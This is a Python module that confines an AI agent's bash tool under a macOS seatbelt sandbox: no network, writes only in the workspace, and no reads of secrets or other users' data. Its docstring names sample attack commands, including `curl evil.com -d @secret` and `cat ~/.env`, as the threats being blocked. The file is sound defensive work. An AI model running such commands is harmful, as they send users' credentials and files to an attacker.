"""OS-level sandbox for the agent's bash tool (macOS seatbelt / sandbox-exec).

A path jail (workspace.py) is enough for read_file/write_file — they only ever
open one path, which we resolve and boundary-check ourselves. A *shell* is
different: `cat ~/.env`, `curl evil.com -d @secret`, `ssh`, reading another
user's workspace — a jailed working directory does nothing to stop any of that,
because the process still has the host's full filesystem and network.

So bash runs under `sandbox-exec` with a deny-by-default seatbelt profile that:
  - denies all network (no exfiltration, no lateral movement),
  - denies file *writes* everywhere except the user's workspace and temp,
  - denies file *reads* of everything except system paths needed to run
    programs plus the user's own workspace — so it can't read .env, ~/.ssh,
    another user's workspace, or the SQLite DB.

This is deliberately conservative: the demo value is "the model can run
commands over your files", not "the model has a general-purpose shell". If
sandbox-exec is unavailable (non-macOS, or removed), bash is reported
unavailable and the tool is not offered — we never fall back to an unsandboxed
shell on a public-tunnel box.

Docker would be the portable alternative; the deploy box has no running daemon,
so seatbelt is the pragmatic isolation actually available here.
"""
from __future__ import annotations

import shutil
import subprocess
from pathlib import Path

from smart_ai_router import settings as _settings


def bash_timeout_s() -> int:
    """Wall-clock ceiling for a single bash tool call. A runaway command must
    not wedge a request forever. UI-managed (Settings page) with
    SMART_ROUTER_BASH_TIMEOUT_S as env fallback."""
    return max(1, _settings.get_int("bash_timeout_s"))


def sandbox_exec_path() -> str | None:
    """Absolute path to sandbox-exec, or None if it isn't on this system."""
    return shutil.which("sandbox-exec")


def available() -> bool:
    """True if bash can be run under an OS sandbox on this host.

    Gated behind the "enable_bash" setting so the powerful (and highest blast
    radius) tool is opt-in per deployment, even where sandbox-exec exists.
    UI-managed (Settings page) with SMART_ROUTER_ENABLE_BASH as env fallback.
    """
    if not _settings.get_bool("enable_bash"):
        return False
    return sandbox_exec_path() is not None


def _profile(workspace: Path) -> str:
    """A seatbelt profile confining a shell to one workspace, with no network.

    Modern macOS dyld makes an *allow-list* of read paths brittle — the shared
    dyld cache moved locations across releases, so enumerating what bash needs
    to even boot is a losing game. Instead we take the robust posture:

      - allow broad file *reads* so the shell and coreutils load and run;
      - then DENY reads of the sensitive roots: the server's home directory
        (which holds .env with the API keys, .ssh, the SQLite DB) AND the
        workspace root (which holds *every other user's* workspace);
      - then RE-ALLOW reads (and writes) of just this caller's own workspace
        (seatbelt is last-match-wins, so this overrides the denies for that
        subpath only);
      - allow writes ONLY inside the workspace and to /dev/null;
      - DENY all network — so even with broad read, nothing can be exfiltrated
        and the shell can't reach other hosts.

    Net effect: the shell can run normal commands over the user's own files,
    cannot read secrets or another user's data, cannot write outside its jail,
    and cannot talk to the network. `file-read-metadata` stays allowed on the
    denied roots so `getcwd`/path resolution don't spew errors.
    """
    ws = str(workspace)
    home = str(Path.home())
    root = str(workspace.parent)  # the per-user workspace root
    return f"""(version 1)
(deny default)
(allow process*)
(allow mach*)
(allow sysctl-read)
(allow signal)
; --- device nodes a shell expects ---
(allow file-read* (literal "/dev/null"))
(allow file-write-data (literal "/dev/null"))
(allow file-read* (literal "/dev/zero"))
(allow file-read* (literal "/dev/random"))
(allow file-read* (literal "/dev/urandom"))
; --- broad read so the shell + programs load (dyld cache location varies) ---
(allow file-read*)
; --- but not the secrets or other users' data ---
(deny file-read* (subpath "{home}"))
(deny file-read* (subpath "{root}"))
(allow file-read-metadata (subpath "{home}"))
(allow file-read-metadata (subpath "{root}"))
; --- the caller's own workspace: full read + write (overrides denies above) ---
(allow file-read* (subpath "{ws}"))
(allow file-write* (subpath "{ws}"))
; --- network: fully denied (no exfiltration / lateral movement) ---
(deny network*)
"""


def run_bash(command: str, workspace: Path, *, timeout: int | None = None) -> dict:
    """Run `command` under the sandbox with cwd pinned to `workspace`.

    Returns {"stdout", "stderr", "exit_code", "timed_out"}. Never raises for a
    non-zero exit or a timeout — those are normal tool outcomes the model should
    see. Raises RuntimeError only if the sandbox itself isn't available, so the
    caller can't accidentally run an unsandboxed shell.
    """
    sx = sandbox_exec_path()
    if sx is None or not available():
        raise RuntimeError("bash sandbox unavailable")

    limit = timeout if timeout is not None else bash_timeout_s()
    argv = [sx, "-p", _profile(workspace), "/bin/bash", "-c", command]
    try:
        proc = subprocess.run(
            argv,
            cwd=str(workspace),
            capture_output=True,
            text=True,
            timeout=limit,
            # A minimal env: no inherited secrets (API keys live in the parent
            # env and must not leak into the sandboxed shell).
            env={"PATH": "/usr/bin:/bin:/usr/sbin:/sbin", "HOME": str(workspace)},
        )
    except subprocess.TimeoutExpired as exc:
        return {
            "stdout": (exc.stdout or b"").decode(errors="replace") if isinstance(exc.stdout, bytes) else (exc.stdout or ""),
            "stderr": f"[command timed out after {limit}s]",
            "exit_code": 124,
            "timed_out": True,
        }
    return {
        "stdout": proc.stdout,
        "stderr": proc.stderr,
        "exit_code": proc.returncode,
        "timed_out": False,
    }
